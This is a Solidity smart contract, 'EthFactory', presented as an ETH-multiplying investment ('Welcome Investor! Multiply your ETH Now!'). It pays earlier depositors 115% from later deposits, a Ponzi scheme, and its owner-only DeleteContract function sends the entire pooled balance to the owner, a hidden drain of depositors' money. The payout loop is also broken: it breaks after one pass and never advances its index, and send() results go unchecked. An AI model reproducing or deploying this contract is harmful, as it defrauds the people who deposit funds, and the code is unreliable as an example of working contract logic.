 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

contract EthFactory{

  struct InvestorArray { address EtherAddress; uint Amount; }
  InvestorArray[] public depositors;

 

  uint public Total_Investors=0;
  uint public Balance = 0;
  uint public Total_Deposited=0;
  uint public Total_Paid_Out=0;
  string public Message="Welcome Investor! Multiply your ETH Now!";
  address public owner;
  modifier manager { if (msg.sender == owner) _ }
  function EthFactory() {owner = msg.sender;}
  function() { enter(); }
  
 

  function enter() {
    if (msg.value > 0) {

    uint Amount=msg.value;								 
    Total_Investors=depositors.length+1;   					  
    depositors.length += 1;                        						 
    depositors[depositors.length-1].EtherAddress = msg.sender;  
    depositors[depositors.length-1].Amount = Amount;           
    Balance += Amount;               						 
    Total_Deposited+=Amount;       						 
    uint payment; uint index=0;

    while (Balance > (depositors[index].Amount * 115/100) && index<Total_Investors)
     {
	if(depositors[index].Amount!=0 )
	{
      payment = depositors[index].Amount *115/100;                            
      depositors[index].EtherAddress.send(payment);                         
      Balance -= depositors[index].Amount *115/100;                          
      Total_Paid_Out += depositors[index].Amount *115/100;            
       depositors[index].Amount=0;                                     
	}break;
      }
  }
}
function DeleteContract() manager { owner.send(Balance); Balance=0; }

}